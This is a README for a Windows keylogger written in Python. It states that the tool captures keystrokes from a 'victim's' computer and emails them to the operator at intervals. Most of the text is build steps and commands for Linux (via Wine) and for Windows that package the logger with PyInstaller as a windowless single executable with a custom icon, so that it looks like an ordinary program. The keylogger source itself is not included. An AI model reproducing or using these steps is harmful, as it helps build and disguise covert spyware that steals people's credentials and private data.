# Keylogger for Windows
<p align="center">
  <img width="460" height="300" src="images/1.jpg">
</p>

## Getting Started

*Keyloggers are often used as a spyware tool by cybercriminals to steal personally identifiable information, login credentials and sensitive enterprise data.*

## What is this ?

This is a simple Python file which is going to capture Keystrokes from the Victim's Computer. 
PyInstaller bundles a Python application and all its dependencies into a single package. The user can run the packaged app without installing a Python interpreter or any modules in the system. 
This normaly acts as an other executable applications and once we open it by giving permission as "run" rather than "Don't run" KABOOM!. At each particular interval you'll get the targeted machine's key strokes via email.

### What are all the things required ?

```
Python 3.7.2+ (version may be less)
wine-4.0 (in case you are using Linux machine)
Modules : pyinstaller, pynput, smtplib
```

### Notes to be remembered

If you are preparing your keylogger in Linux machine then follow these steps,

1. Download Python for Windows in Linux ( You should be able to run a ".exe" using Wine )
2. Download Wine using these steps
```
sudo dpkg --add-architecture i386
sudo apt-get update 
sudo apt-get install wine:i386
sudo apt-get install wine-bin:i386
```
3. Installing pynput and pyinstaller
```
wine "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python37/python.exe" -m pip install pynput pyinstaller
```
4. Packaging ( with image icon )
```
wine "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python37/Scripts/pyinstaller.exe" --onefile --noconsole --icon '/root/Downloads/img.ico' logger.py
``` 
If you are preparing your keylogger in Windows machine then follow these steps,

1. From Python installed directory execute
```
C:\Python37\python.exe -m pip install pyinstaller pynput
```
2. Packaging (with image icon )
```
C:\Python37\Scripts\pyinstaller.exe --onefile --noconsole --icon 'C:\Users\CandyBird\Downloads\img.ico' logger.py
```

